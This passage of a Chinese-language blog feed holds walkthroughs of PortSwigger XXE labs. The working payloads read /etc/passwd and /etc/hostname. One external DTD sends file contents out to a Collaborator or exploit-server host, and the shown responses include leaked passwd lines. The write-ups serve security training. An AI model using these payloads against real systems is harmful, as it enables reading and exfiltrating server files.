+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &amp;#39;file:///invalid/%file;&amp;#39;&amp;gt;&lt;/span>&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%eval;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%exfil;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img alt="Exploit server" src="/img/2025/xxe-lab-xxe-with-data-retrieval-via-error-messages-2.jpg">&lt;/li>
+&lt;li>修改步骤2的请求，并新增&lt;code>&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY % xxe SYSTEM &amp;quot;YOUR-DTD-URL&amp;quot;&amp;gt; %xxe;]&amp;gt;&lt;/code>在请求体中，发送请求即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;!DOCTYPE foo [
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;!ENTITY % xxe SYSTEM &amp;#34;https://exploit-0a79004704633ad283a822e901fa005e.exploit-server.net/exploit&amp;#34;&amp;gt; %xxe;]&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>/portswigger-posts/xxe-lab-xxe-with-out-of-band-exfiltration/</link><pubDate>Sat, 04 Jan 2025 16:54:08 +0800</pubDate><guid>/portswigger-posts/xxe-lab-xxe-with-out-of-band-exfiltration/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID&amp;#34; 服务器返回报错，但是没有将a返回 使用Burp Collaborator产生Collaborator server3w0sl4rsrlhtm1numje9gdmdk4qxen2c.oastify.com 点击最上方Go to exploit server，构建以下格式的Body并点击最下方的Store &amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/hostname&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &amp;#39;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; %eval; %exfil; 修改步骤1的请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url)并发送请求 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;https://exploit-0a7f00f104459f5b83a15f7c016d001a.</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-xxe-with-out-of-band-exfiltration-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器返回报错，但是没有将&lt;code>a&lt;/code>返回&lt;/li>
+&lt;li>使用Burp Collaborator产生Collaborator server&lt;code>3w0sl4rsrlhtm1numje9gdmdk4qxen2c.oastify.com&lt;/code>&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>，构建以下格式的Body并点击最下方的&lt;code>Store&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/hostname&amp;#34;&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &amp;#39;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;&amp;#39;&amp;gt;&lt;/span>&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%eval;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%exfil;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img alt="Exploit server" src="/img/2025/xxe-lab-xxe-with-out-of-band-exfiltration-2.jpg">&lt;/li>
+&lt;li>修改步骤1的请求体(定义&lt;code>外部实体xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url)并发送请求
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE foo [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY % xxe SYSTEM &amp;#34;https://exploit-0a7f00f104459f5b83a15f7c016d001a.exploit-server.net/exploit&amp;#34;&amp;gt; %xxe;]&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;XML parsing error&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>查看Burp Collaborator分页，当中的HTTP请求参数即为解题所需，回到页面点击最上方&lt;code>Submit solution&lt;/code>即可解题
+&lt;img alt="Burp Collaborator" src="/img/2025/xxe-lab-xxe-with-out-of-band-exfiltration-3.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>/portswigger-posts/xxe-lab-xxe-with-out-of-band-interaction-using-parameter-entities/</link><pubDate>Sat, 04 Jan 2025 16:11:40 +0800</pubDate><guid>/portswigger-posts/xxe-lab-xxe-with-out-of-band-interaction-using-parameter-entities/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID&amp;#34; 服务器返回报错，但是没有将a返回，使用Burp Collaborator产生Collaborator serverki697ld9d23a8i9b800q2u8u6lcd06ov.oastify.com 构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://ki697ld9d23a8i9b800q2u8u6lcd06ov.oastify.com&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Entities are not allowed for security reasons&amp;#34; 构造以下请求体(定义参数实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;?</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-xxe-with-out-of-band-interaction-using-parameter-entities-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器返回报错，但是没有将&lt;code>a&lt;/code>返回，使用Burp Collaborator产生Collaborator server&lt;code>ki697ld9d23a8i9b800q2u8u6lcd06ov.oastify.com&lt;/code>&lt;/li>
+&lt;li>构造以下请求体(定义&lt;code>外部实体xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE root [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://ki697ld9d23a8i9b800q2u8u6lcd06ov.oastify.com&amp;#34;&amp;gt; ]&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Entities are not allowed for security reasons&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>构造以下请求体(定义&lt;code>参数实体xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE root [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY % xxe SYSTEM &amp;#34;http://ki697ld9d23a8i9b800q2u8u6lcd06ov.oastify.com&amp;#34;&amp;gt; %xxe; ]&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> %xxe;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;XML parsing error&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>/portswigger-posts/xxe-lab-xxe-with-out-of-band-interaction/</link><pubDate>Sat, 04 Jan 2025 13:14:35 +0800</pubDate><guid>/portswigger-posts/xxe-lab-xxe-with-out-of-band-interaction/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID&amp;#34; 服务器返回报错，但是没有将a返回，使用Burp Collaborator产生Collaborator server705wp8vwvplxq5ryqnidkhqho8uzip6e.oastify.com 构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://705wp8vwvplxq5ryqnidkhqho8uzip6e.oastify.com&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID&amp;#34;</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-xxe-with-out-of-band-interaction-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
